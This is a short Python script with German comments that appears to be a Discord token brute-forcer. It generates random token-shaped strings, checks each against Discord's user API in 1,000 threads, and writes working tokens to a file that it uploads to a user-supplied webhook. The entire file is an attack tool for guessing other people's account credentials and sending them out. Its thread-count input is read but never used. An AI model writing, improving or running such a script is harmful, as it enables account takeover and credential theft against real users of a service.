import string
import requests
import json
import random
import threading
import os

# Funktion zur Fehlerbehandlung
def Error(message):
    print(f"[ERROR] {message}")

# Funktion zum Senden einer Nachricht an den Webhook
def send_webhook(file_path, webhook_url):
    with open(file_path, 'rb') as file:
        payload = {
            'file': (os.path.basename(file_path), file)
        }
        requests.post(webhook_url, files=payload)

# Funktion zur Überprüfung von Token
def token_check(token, valid_tokens):
    headers = {'Authorization': token}
    try:
        response = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
        if response.status_code == 200:
            valid_tokens.append(token)
    except Exception as e:
        Error(f"Fehler bei der Token-Überprüfung: {e}")

# Token-Generator
def generate_token():
    first = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([24, 26])))
    second = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(6))
    third = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(38))
    return f"{first}.{second}.{third}"

def main():
    try:
        webhook_url = input("Webhook URL -> ")
        threads_number = int(input("Threads Number -> "))
    except ValueError:
        Error("Ungültige Eingabe. Bitte geben Sie eine Zahl für die Threads-Nummer ein.")
        return

    valid_tokens = []
    threads = []

    # Token überprüfen
    for _ in range(1000):
        token = generate_token()
        t = threading.Thread(target=token_check, args=(token, valid_tokens))
        t.start()
        threads.append(t)

    for thread in threads:
        thread.join()

    # Gültige Token in eine Textdatei schreiben
    with open('valid_tokens.txt', 'w') as file:
        for token in valid_tokens:
            file.write(f"{token}\n")

    # Datei an den Webhook senden
    send_webhook('valid_tokens.txt', webhook_url)
    print("Gültige Token wurden an den Webhook gesendet.")

if __name__ == "__main__":
    main()
